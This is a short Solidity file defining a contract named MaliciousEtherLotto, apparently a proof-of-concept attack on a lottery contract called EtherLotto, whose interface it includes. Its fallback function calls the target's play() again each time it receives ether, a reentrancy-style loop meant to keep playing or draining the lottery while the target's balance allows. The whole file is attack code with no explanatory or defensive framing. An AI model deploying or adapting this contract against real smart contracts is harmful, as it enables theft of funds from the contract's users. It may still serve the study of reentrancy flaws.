pragma solidity ^0.4.15;

contract MaliciousEtherLotto {
    EtherLotto target;

    function MaliciousEtherLotto(address _target) public {
        target = EtherLotto(_target);
    }

    function attack() public payable {
        target.play.value(msg.value)();
    }

    function() public payable {
        if (address(target).balance >= target.TICKET_AMOUNT()) {
            target.play.value(target.TICKET_AMOUNT())();
        }
    }
}

// Interface of the target EtherLotto contract
contract EtherLotto {
    uint public constant TICKET_AMOUNT = 10 ether;
    function play() public payable;
}